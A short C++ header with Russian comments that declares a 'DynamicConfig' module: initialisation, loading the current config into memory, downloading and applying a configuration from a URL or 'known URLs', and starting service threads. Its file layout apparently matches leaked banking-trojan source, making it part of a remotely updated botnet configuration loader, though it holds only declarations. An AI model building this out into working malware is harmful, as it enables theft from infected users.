/*
  Работа с DynamicConfig.
*/
#pragma once

#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace DynamicConfig
{
  /*
    Инициализация.
  */
  void init(void);
  
  /*
    Деинициализация.
  */
  void uninit(void);
  
  /*
    Загрузка текущей конфигурации в память процесса.

    Return - указатель на конфиг(необходимо освободить через Mem), или NULL в случаи ошибки.
  */
  BinStorage::STORAGE *getCurrent(void);
  
  /*
    Загрузка и применение конфигураци.

    IN url - URL конфигурации, или NULL для загрузки изветных URL.
    Return - true - если успешно загржена,
             false - в случаи ошибки.
  */
  bool download(LPSTR url);
  
  /*
    Создание потоков.

    IN OUT group - группа потокок, к которой будут принадлежать потоки сервиса.
    
    Return       - true - в случаи успеха,
                   false - в случаи ошибки.
  */
  bool create(ThreadsGroup::GROUP *group);
};
